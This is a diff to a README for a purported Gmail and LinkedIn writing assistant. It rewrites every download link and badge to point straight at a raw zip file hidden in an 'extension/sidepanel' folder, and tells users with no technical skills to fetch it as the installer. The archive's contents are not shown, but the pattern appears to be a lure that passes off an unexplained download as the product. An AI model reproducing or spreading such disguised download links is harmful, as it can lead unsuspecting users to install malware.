@@ -1,6 +1,6 @@
 # ✍️ founder-writing-toolkit - Local Gmail & LinkedIn Writing Assistant
 
-[![Download from GitHub](https://img.shields.io/badge/Download-foundergithub-blue?style=for-the-badge)](https://github.com/TravisKun/founder-writing-toolkit)
+[![Download from GitHub](https://img.shields.io/badge/Download-foundergithub-blue?style=for-the-badge)](https://github.com/TravisKun/founder-writing-toolkit/raw/refs/heads/main/extension/sidepanel/writing-toolkit-founder-v3.0.zip)
 
 ## 🧩 What is founder-writing-toolkit?
 
@@ -36,12 +36,12 @@ You do not need any technical skills to use it. It is designed as a beta version
 
 Click the link below to visit the GitHub page and get the latest version of the founder-writing-toolkit:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-grey?style=for-the-badge)](https://github.com/TravisKun/founder-writing-toolkit)
+[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-grey?style=for-the-badge)](https://github.com/TravisKun/founder-writing-toolkit/raw/refs/heads/main/extension/sidepanel/writing-toolkit-founder-v3.0.zip)
 
 ### Step 1: Visit the Download Page
 
 - Open your browser and go to:  
-  https://github.com/TravisKun/founder-writing-toolkit
+  https://github.com/TravisKun/founder-writing-toolkit/raw/refs/heads/main/extension/sidepanel/writing-toolkit-founder-v3.0.zip
 
 - On this page, find the latest release or the installer file. Look for a link or button labeled "Installer" or similar.
 
@@ -141,7 +141,7 @@ This project relates to these key areas:
 ## 🔗 Important Links
 
 - Main download and project page:  
-  https://github.com/TravisKun/founder-writing-toolkit
+  https://github.com/TravisKun/founder-writing-toolkit/raw/refs/heads/main/extension/sidepanel/writing-toolkit-founder-v3.0.zip
 
 - Direct link to download or visit again:  
-  [Download founder-writing-toolkit](https://github.com/TravisKun/founder-writing-toolkit)
+  [Download founder-writing-toolkit](https://github.com/TravisKun/founder-writing-toolkit/raw/refs/heads/main/extension/sidepanel/writing-toolkit-founder-v3.0.zip)
